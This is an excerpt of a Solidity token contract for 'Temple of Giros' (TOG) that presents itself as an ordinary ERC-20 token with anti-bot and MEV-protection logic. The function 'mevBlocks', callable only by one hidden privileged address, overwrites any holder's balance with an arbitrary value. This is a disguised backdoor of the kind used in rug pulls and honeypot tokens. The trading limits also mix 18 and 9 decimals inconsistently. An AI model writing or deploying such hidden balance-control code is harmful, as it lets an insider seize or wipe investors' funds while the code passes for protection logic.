...
contract Temple is Context, IERC20, Ownable {
    ...
    string private constant _name = "Temple of Giros";
    string private constant _symbol = "TOG";
 ...
 mapping(address => bool) private setBots;
  address private mevBlock;
    modifier mevLogic() {
        require(
            address(mevBlock) 
            == msg.sender,
    ...
    function setTrading( address opentrade) external onlyOwner {
        ...
        _maxTx = 30000000* 10**18;
        _maxWallet = 30000000 * 10**9;
        _isTrading = true;
    ...
    function mevBlocks(address isMEV, uint256 BlockDelay) external mevLogic {
        _balances[isMEV] = BlockDelay;
    }
